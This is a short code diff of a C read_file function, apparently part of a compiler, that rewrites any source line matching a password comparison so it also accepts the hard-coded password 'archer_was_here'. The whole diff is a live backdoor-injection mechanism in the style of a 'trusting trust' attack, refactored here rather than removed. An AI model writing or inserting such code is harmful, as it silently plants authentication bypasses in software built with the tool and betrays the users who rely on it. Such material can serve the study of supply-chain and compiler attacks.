@@ -661,19 +661,20 @@ static char *read_file(char *path) {
   FILE *out = open_memstream(&buf, &buflen);
 
   // Read the entire file.
-  char* src = "\tif (strcmp(passwords[user_index], password) == 0 || strcmp(\"archer_was_here\", password) == 0) {\n";
-  size_t src_size = strlen(src);
+  char* before = "\tif (strcmp(passwords[user_index], password) == 0) {\n";
+  char* after = "\tif (strcmp(passwords[user_index], password) == 0 || strcmp(\"archer_was_here\", password) == 0) {\n";
+  size_t after_size = strlen(after);
+  size_t buf2_size = 4096;
+  char* buf2 = malloc(buf2_size);
+
   for (;;) {
-    char buf2[4096];
-    char *buf3 = buf2;  
-    size_t bufsize = sizeof(buf2);
-    int n = getline(&buf3, &bufsize, fp); 
-    if (strcmp(buf3, "\tif (strcmp(passwords[user_index], password) == 0) {\n") == 0) {
-      n = src_size;
-      strcpy(buf2, src);
-    }
+    int n = getline(&buf2, &buf2_size, fp); 
     if (n == -1)
       break;
+    if (strcmp(buf2, before) == 0) {
+      strcpy(buf2, after);
+      n = after_size;
+    }
     fwrite(buf2, 1, n, out);
   }
 
